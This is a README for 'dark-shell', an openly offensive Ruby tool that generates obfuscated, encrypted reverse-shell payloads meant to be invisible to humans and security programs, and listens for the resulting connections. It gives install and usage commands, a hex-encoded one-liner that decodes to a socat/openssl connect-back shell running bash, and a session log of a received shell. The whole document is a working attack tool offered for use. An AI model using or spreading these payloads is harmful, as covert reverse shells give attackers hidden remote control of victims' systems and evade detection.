# dark-shell
Some shells which are invisible to humans or programs.

[中文文档](https://green-m.me/2019/11/06/encrypt-reverse-shell/)

# Install

Just download the dark_shell.rb, and install some dependency.

```
gem install rex rex-socket base32
```

# Usage

Run script without parameter to get help info.

```
$ ruby dark_shell.rb


____             _         ____  _          _ _
|  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
| | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
| |_| | (_| | |  |   <      ___) | | | |  __/ | |
|____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|


See more: https://github.com/Green-m/dark-shell

Dark shell listen server.

Usage:
  ruby dark_shell.rb <action> <ipaddress> <port> <type>
Action: gen, listen, gencode
  gen:      generate payload to run.
  gencode:  generate payload(encoded) to run.
  listen:   listen as a server.

Type: hex, ssl, base64, base32


Example:
  ruby dark_shell.rb listen 127.0.0.1 4444 hex
  ruby dark_shell.rb listen 0.0.0.0 4444
  ruby dark_shell.rb listen
  ruby dark_shell.rb gencode 8.8.8.8 1337 ssl
  ruby dark_shell.rb gen 8.8.8.8 4444 base64
  ruby dark_shell.rb gen
```


Get some connect back payloads.

```
ruby dark_shell.rb gencode 127.0.0.1 1337 ssl
```

And the we get a lot of payloads, pick one, for instance:

```
sh -c '{echo,736f63617420657865633a276261736827206f70656e73736c2d636f6e6e6563743a3132372e302e302e313a313333372c7665726966793d30}|{xxd,-p,-r}|{bash,-i}'
```

Start listening

```
$ ruby dark_shell.rb listen 127.0.0.1 1337 ssl


____             _         ____  _          _ _
|  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
| | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
| |_| | (_| | |  |   <      ___) | | | |  __/ | |
|____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|


See more: https://github.com/Green-m/dark-shell

Type: 'SSL'
Starting listen 127.0.0.1:1337
Received from 127.0.0.1:57323
Input is ready.
pwd
>/private/tmp
whoami
>green


```
